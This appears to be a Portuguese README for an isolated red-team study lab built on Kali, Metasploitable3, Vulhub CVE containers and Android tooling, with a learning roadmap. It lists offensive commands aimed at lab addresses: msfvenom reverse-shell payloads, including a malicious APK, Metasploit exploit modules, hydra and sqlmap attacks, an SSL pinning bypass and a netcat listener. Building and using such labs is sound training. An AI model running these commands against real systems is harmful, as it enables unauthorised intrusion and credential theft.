# 🔴 Red Team Lab — Ambiente Completo de Estudo

> Laboratório isolado para estudo de pentest, CVEs reais, exploração de vulnerabilidades e Android security research. **100% para fins educacionais em ambiente controlado.**

---

## Índice

1. [Visão Geral](#visão-geral)
2. [Requisitos do Host](#requisitos-do-host)
3. [Arquitetura da Rede](#arquitetura-da-rede)
4. [Instalação Automatizada](#instalação-automatizada)
5. [VMs do Laboratório](#vms-do-laboratório)
6. [CVE Framework com Vulhub](#cve-framework-com-vulhub)
7. [Laboratório Android](#laboratório-android)
8. [Ferramentas Incluídas](#ferramentas-incluídas)
9. [CVEs para Estudo](#cves-para-estudo)
10. [Workflow de Estudo](#workflow-de-estudo)
11. [Comandos de Referência Rápida](#comandos-de-referência-rápida)
12. [Roteiro de Aprendizado](#roteiro-de-aprendizado)
13. [Aviso Legal](#aviso-legal)

---

## Visão Geral

Este laboratório provisiona automaticamente um ambiente red team completo com:

- **Kali Linux** como VM atacante com todas as ferramentas pré-instaladas
- **Metasploitable3** como VM alvo clássica
- **DVWA** (Damn Vulnerable Web Application) para prática web
- **Vulhub** com Docker para exploração de CVEs reais
- **Ambiente Android** com emulador + Frida + MobSF + APKTool
- **OpenVAS/Greenbone** para scanning de vulnerabilidades
- Rede NAT isolada — sem risco de vazar para a internet

```
┌─────────────────────────────────────────────────────┐
│                  HOST (seu PC)                      │
│                  VirtualBox                         │
│                                                     │
│  ┌──────────────┐    ┌──────────────────────────┐   │
│  │  VM ATACANTE │    │      VMs ALVO            │   │
│  │  Kali Linux  │◄──►│  Metasploitable3         │   │
│  │  192.168.56.10│   │  DVWA (Docker)           │   │
│  │              │    │  Vulhub CVEs (Docker)    │   │
│  │  Ferramentas:│    │  Android Emulado         │   │
│  │  - MSF       │    │  192.168.56.20-30        │   │
│  │  - Burp      │    └──────────────────────────┘   │
│  │  - Frida     │                                   │
│  │  - OpenVAS   │    Rede: Host-Only 192.168.56.0/24│
│  └──────────────┘    NAT isolada — sem internet     │
└─────────────────────────────────────────────────────┘
```

---

## Requisitos do Host

| Componente | Mínimo | Recomendado |
|---|---|---|
| CPU | 4 cores | 8+ cores (com VT-x/AMD-V habilitado) |
| RAM | 8 GB | 16–32 GB |
| Disco | 80 GB livres | 150 GB+ SSD |
| OS | Windows 10/11, Ubuntu 22.04+, macOS 12+ | Ubuntu 22.04 LTS |
| Virtualização | VT-x ou AMD-V ativado na BIOS | — |

**Dependências do host:**
- [VirtualBox 7.x](https://www.virtualbox.org/wiki/Downloads) + Extension Pack
- [Vagrant](https://developer.hashicorp.com/vagrant/downloads) (para Metasploitable3 automático)
- Git
- curl / wget

---

## Arquitetura da Rede

```
192.168.56.0/24  —  Host-Only Network (isolada)

192.168.56.1   → Host (gateway)
192.168.56.10  → Kali Linux (atacante)
192.168.56.20  → Metasploitable3 (alvo Linux)
192.168.56.21  → DVWA via Docker na Kali
192.168.56.22  → Android Emulador (ADB 5555)
192.168.56.30+ → Vulhub CVE containers
```

> **Segurança:** A rede Host-Only garante que as VMs vulneráveis **nunca** se comunicam com a internet real. O Kali tem acesso NAT separado apenas para downloads durante o setup.

---

## Instalação Automatizada

### Método rápido (recomendado)

```bash
# 1. Clonar este repositório
git clone https://github.com/seu-usuario/redteam-lab.git
cd redteam-lab

# 2. Dar permissão e executar
chmod +x setup.sh
sudo ./setup.sh

# 3. Aguardar (~20–40 min dependendo da internet)
# O script instala tudo automaticamente
```

### O que o script `setup.sh` faz

1. Verifica e instala dependências do host (VirtualBox, Vagrant, Docker, Git)
2. Cria a rede Host-Only `192.168.56.0/24` no VirtualBox
3. Baixa e inicia a VM Kali Linux
4. Instala todas as ferramentas red team no Kali via provisionamento
5. Baixa e inicia o Metasploitable3 via Vagrant
6. Clona o Vulhub dentro do Kali
7. Configura o ambiente Android (Genymotion CLI ou AVD)
8. Instala e configura o OpenVAS/Greenbone
9. Gera um snapshot de cada VM (estado limpo para reset)

---

## VMs do Laboratório

### VM 1 — Kali Linux (Atacante)

- **ISO:** Kali Linux 2024.x (64-bit)
- **RAM:** 4 GB | **CPU:** 2 cores | **Disco:** 40 GB
- **Rede:** NAT (internet para updates) + Host-Only (lab)
- **IP:** `192.168.56.10`

**Ferramentas pré-instaladas pelo script:**

```
Reconhecimento:    nmap, masscan, netdiscover, enum4linux, dnsx
Web:               burpsuite, sqlmap, nikto, ffuf, gobuster, wfuzz
Exploit:           metasploit-framework, exploitdb, searchsploit
Passwords:         john, hashcat, hydra, medusa
Android:           adb, apktool, jadx, frida-tools, objection, mobsf
CVE/Docker:        docker, docker-compose, vulhub
Scanner:           openvas, gvm
Sniffing:          wireshark, tcpdump, bettercap
Misc:              tmux, vim, python3, pip3, go, ruby, curl, jq
```

### VM 2 — Metasploitable3 (Alvo Linux)

- **Base:** Ubuntu 14.04 com serviços vulneráveis
- **RAM:** 1 GB | **CPU:** 1 core | **Disco:** 15 GB
- **IP:** `192.168.56.20`

**Serviços vulneráveis disponíveis:**

| Porta | Serviço | Vulnerabilidade |
|---|---|---|
| 21 | FTP (ProFTPD) | Backdoor mod_copy |
| 22 | SSH | Brute force, misconfiguration |
| 80 | Apache + PHP | WebApp vulns, RFI |
| 445 | Samba | EternalBlue-like, enum |
| 3306 | MySQL | Weak credentials |
| 8080 | Jenkins | Script console RCE |
| 8181 | Apache Struts | CVE-2017-5638 |

---

## CVE Framework com Vulhub

### Estrutura

```
vulhub/
├── log4j/CVE-2021-44228/      ← Log4Shell
├── struts2/CVE-2017-5638/     ← Apache Struts RCE
├── spring/CVE-2022-22965/     ← Spring4Shell
├── weblogic/CVE-2019-2725/    ← WebLogic RCE
├── bash/CVE-2014-6271/        ← Shellshock
├── sudo/CVE-2021-3156/        ← Baron Samedit
├── redis/CVE-2022-0543/       ← Redis LPE
├── wordpress/...              ← Múltiplos CVEs
└── nginx/...                  ← Múltiplos CVEs
```

### Comandos básicos Vulhub

```bash
# Entrar na pasta do CVE
cd ~/vulhub/log4j/CVE-2021-44228

# Subir o ambiente vulnerável
docker-compose up -d

# Ver containers rodando e portas mapeadas
docker-compose ps

# Ver logs do container
docker-compose logs -f

# Parar e limpar após o estudo
docker-compose down -v

# Listar todos os CVEs disponíveis
ls ~/vulhub/*/CVE-* | head -50
```

### Script helper para Vulhub

```bash
# Usar o helper incluído no lab
./vulhub-helper.sh list              # lista todos os CVEs
./vulhub-helper.sh start log4j/CVE-2021-44228
./vulhub-helper.sh stop  log4j/CVE-2021-44228
./vulhub-helper.sh reset             # para todos os containers
```

---

## Laboratório Android

### Componentes

| Ferramenta | Função |
|---|---|
| Android Studio AVD / Genymotion | Emulador Android (alvo) |
| ADB (Android Debug Bridge) | Comunicação com o dispositivo |
| APKTool | Descompilar/recompilar APKs |
| JADX | Decompilação para Java legível |
| Frida | Instrumentação dinâmica / hooking |
| Objection | Framework Frida automático |
| MobSF | Análise estática e dinâmica de APKs |
| DIVA APK | App vulnerável para praticar |
| InsecureBankv2 | App vulnerável para praticar |

### Comandos essenciais Android

```bash
# Listar dispositivos/emuladores conectados
adb devices

# Instalar APK no emulador
adb install app-vulnerable.apk

# Shell interativo no Android
adb shell

# Copiar arquivo do emulador para o host
adb pull /data/data/com.app.nome/shared_prefs/prefs.xml .

# Iniciar o servidor Frida no emulador
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# Listar processos com Frida
frida-ps -U

# Bypass de SSL Pinning com Objection
objection -g com.app.nome explore
# dentro do shell Objection:
android sslpinning disable

# Descompilar APK com APKTool
apktool d app.apk -o app_decompilado/

# Decompilação para Java legível com JADX
jadx -d saida/ app.apk

# Iniciar MobSF (análise completa)
cd ~/MobSF && ./run.sh 0.0.0.0:8000
# Acessar: http://127.0.0.1:8000
```

### APPs vulneráveis incluídas

```bash
# DIVA (Damn Insecure and Vulnerable App)
adb install ~/android-labs/diva.apk

# InsecureBankv2 (server + app)
cd ~/android-labs/InsecureBankv2
python2 app/AndroLabServer/server.py &
adb install InsecureBank.apk

# InjuredAndroid (CTF-style)
adb install ~/android-labs/injuredandroid.apk
```

---

## Ferramentas Incluídas

### Reconhecimento e Scanning

```bash
# Port scan completo
nmap -sV -sC -p- -T4 192.168.56.20

# Descoberta de hosts na rede do lab
netdiscover -r 192.168.56.0/24

# Scan de vulnerabilidades com Nikto
nikto -h http://192.168.56.20

# Enumerar Samba/SMB
enum4linux -a 192.168.56.20

# Brute force de diretórios web
gobuster dir -u http://192.168.56.20 -w /usr/share/wordlists/dirb/common.txt
```

### Metasploit Framework

```bash
# Iniciar o console MSF
msfconsole

# Buscar módulo por CVE
search cve:2021-44228
search type:exploit name:struts

# Usar um módulo
use exploit/multi/http/log4shell_header_injection
show options
set RHOSTS 192.168.56.20
set LHOST 192.168.56.10
run

# Gerar payload com msfvenom
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.10 LPORT=4444 -f elf -o shell.elf

# Gerar payload APK Android
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.56.10 LPORT=4444 -o evil.apk
```

### Web Application Testing

```bash
# SQLMap em formulário
sqlmap -u "http://192.168.56.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx; security=low" --dbs

# Burp Suite (proxy)
# Configurar browser: HTTP proxy 127.0.0.1:8080

# XSS testing com curl
curl -s "http://alvo/search?q=<script>alert(1)</script>"

# Brute force de login
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.56.20 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed"
```

### OpenVAS / Greenbone

```bash
# Iniciar OpenVAS
gvm-start

# Verificar status
gvm-check-setup

# Acessar interface web
# https://127.0.0.1:9392
# Usuário: admin / Senha gerada no setup
```

---

## CVEs para Estudo

### Tier 1 — Iniciante

| CVE | Nome | Vetor | Vulhub Path |
|---|---|---|---|
| CVE-2014-6271 | Shellshock | HTTP Header → Bash RCE | `bash/CVE-2014-6271` |
| CVE-2017-5638 | Struts2 OGNL | Content-Type Header RCE | `struts2/CVE-2017-5638` |
| CVE-2021-44228 | Log4Shell | JNDI Lookup RCE | `log4j/CVE-2021-44228` |

### Tier 2 — Intermediário

| CVE | Nome | Vetor | Vulhub Path |
|---|---|---|---|
| CVE-2019-2725 | WebLogic Deserialization | HTTP RCE sem autenticação | `weblogic/CVE-2019-2725` |
| CVE-2021-3156 | Baron Samedit | sudo heap overflow → LPE | `sudo/CVE-2021-3156` |
| CVE-2022-22965 | Spring4Shell | ClassLoader abuse RCE | `spring/CVE-2022-22965` |
| CVE-2022-0543 | Redis LPE | Lua sandbox escape | `redis/CVE-2022-0543` |

### Tier 3 — Avançado

| CVE | Nome | Vetor | Vulhub Path |
|---|---|---|---|
| CVE-2021-26084 | Confluence OGNL | OGNL RCE sem auth | `confluence/CVE-2021-26084` |
| CVE-2022-1388 | F5 BIG-IP Auth Bypass | Auth bypass → RCE | `f5/CVE-2022-1388` |
| CVE-2023-44487 | HTTP/2 Rapid Reset | DDoS Protocol Abuse | `nginx/CVE-2023-44487` |

### Processo de estudo por CVE

```
1. Pesquisar  → nvd.nist.gov/<CVE-ID>   (entender o mecanismo)
2. Subir      → docker-compose up -d     (ambiente vulnerável)
3. Confirmar  → nmap / curl              (serviço está vivo)
4. Explorar   → manualmente com curl / Burp primeiro
5. Automatizar→ searchsploit / msfconsole
6. Documentar → escrever mini-relatório (impacto + mitigação)
7. Limpar     → docker-compose down -v
```

---

## Workflow de Estudo

### Sessão típica de lab

```bash
# 1. Iniciar a VM Kali (se usando VirtualBox headless)
VBoxManage startvm "Kali-RedTeam" --type headless

# 2. SSH na Kali
ssh kali@192.168.56.10

# 3. Escolher o CVE do dia
cd ~/vulhub/log4j/CVE-2021-44228
docker-compose up -d

# 4. Confirmar que o alvo está vivo
nmap -sV 127.0.0.1 -p 8080

# 5. Explorar
# (ver seção de comandos específicos do CVE)

# 6. Ao terminar
docker-compose down -v

# 7. Shutdown da VM
sudo poweroff
```

### Reset rápido do lab

```bash
# Restaurar snapshot limpo de todas as VMs
./reset-lab.sh

# Ou manualmente:
VBoxManage snapshot "Kali-RedTeam" restore "clean-state"
VBoxManage snapshot "Metasploitable3" restore "clean-state"
```

---

## Comandos de Referência Rápida

```bash
# ═══ RECONHECIMENTO ══════════════════════════════════
nmap -sn 192.168.56.0/24                     # descobrir hosts
nmap -sV -sC -p- 192.168.56.20               # scan completo
nmap --script vuln 192.168.56.20             # scripts de vulnerabilidade

# ═══ METASPLOIT ══════════════════════════════════════
msfconsole -q                                # iniciar silencioso
search cve:2021-44228                        # buscar módulo
use <módulo>; show options; run              # executar exploit
sessions -l                                 # listar sessões abertas
sessions -i 1                               # interagir com sessão

# ═══ VULHUB ══════════════════════════════════════════
cd ~/vulhub/<app>/<CVE>
docker-compose up -d                         # subir alvo
docker-compose ps                            # ver status
docker-compose logs -f                       # ver logs
docker-compose down -v                       # destruir tudo

# ═══ ANDROID ═════════════════════════════════════════
adb devices                                  # listar dispositivos
adb shell                                    # shell no Android
frida-ps -U                                  # listar processos
objection -g com.app explore                 # instrumentar app
apktool d app.apk -o saida/                  # descompilar APK
jadx -d saida/ app.apk                       # decompilação Java

# ═══ WEB ═════════════════════════════════════════════
gobuster dir -u http://alvo -w /usr/share/wordlists/dirb/common.txt
sqlmap -u "http://alvo/page?id=1" --dbs
nikto -h http://alvo

# ═══ SENHAS ══════════════════════════════════════════
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
hydra -l admin -P rockyou.txt ssh://192.168.56.20

# ═══ SHELLS ══════════════════════════════════════════
nc -lvnp 4444                                # listener netcat
python3 -c 'import pty;pty.spawn("/bin/bash")'  # TTY estável
```

---

## Roteiro de Aprendizado

### Mês 1 — Fundamentos

- [ ] Configurar o lab completo com o script automático
- [ ] Aprender Nmap (host discovery, port scan, scripts)
- [ ] Praticar Metasploit no Metasploitable3 (explorar 5 serviços)
- [ ] Estudar OWASP Top 10 no DVWA (SQLi, XSS, CSRF, LFI, Upload)
- [ ] Shellshock e Struts2 no Vulhub

### Mês 2 — CVEs e Exploit Dev

- [ ] Log4Shell — exploração manual + MSF
- [ ] Spring4Shell — ClassLoader abuse
- [ ] Baron Samedit — Privilege Escalation no Linux
- [ ] Começar TryHackMe (salas: Pre-Security, Jr Pentester)
- [ ] Certificação: **eJPT** (INE Security)

### Mês 3 — Android e Web Avançado

- [ ] Análise estática de APK com APKTool + JADX
- [ ] Bypass de SSL Pinning com Frida/Objection
- [ ] Análise dinâmica com MobSF
- [ ] DIVA e InsecureBankv2 completos
- [ ] HackTheBox — máquinas Easy/Medium

### Mês 4+ — Red Team Real

- [ ] Active Directory attacks (BloodHound, Mimikatz)
- [ ] C2 Frameworks (Havoc, Sliver)
- [ ] Preparação para **PNPT** ou **OSCP**

---

## Plataformas de Prática Online

| Plataforma | Nível | Foco |
|---|---|---|
| [TryHackMe](https://tryhackme.com) | Iniciante → Intermediário | Guiado, ótimo para começar |
| [HackTheBox](https://hackthebox.com) | Intermediário → Avançado | Máquinas realistas |
| [VulnHub](https://vulnhub.com) | Todos | VMs offline para baixar |
| [PortSwigger Academy](https://portswigger.net/web-security) | Todos | Web app hacking gratuito |
| [PentesterLab](https://pentesterlab.com) | Todos | CVEs e web |

---

## Aviso Legal

> ⚠️ **Este laboratório destina-se exclusivamente a fins educacionais.**
>
> Todas as VMs e containers são sistemas vulneráveis intencionalmente criados para estudo. A rede é isolada e não há conexão com sistemas externos durante os exercícios.
>
> **É crime** utilizar estas técnicas em sistemas, redes ou dispositivos sem **autorização explícita por escrito** do proprietário. No Brasil, a Lei 12.737/2012 (Lei Carolina Dieckmann) e o Art. 154-A do Código Penal tipificam invasão de dispositivos informáticos.
>
> O autor não se responsabiliza pelo uso indevido das técnicas apresentadas neste laboratório.

---

*Laboratório criado para estudo ético de segurança ofensiva. Use com responsabilidade.*
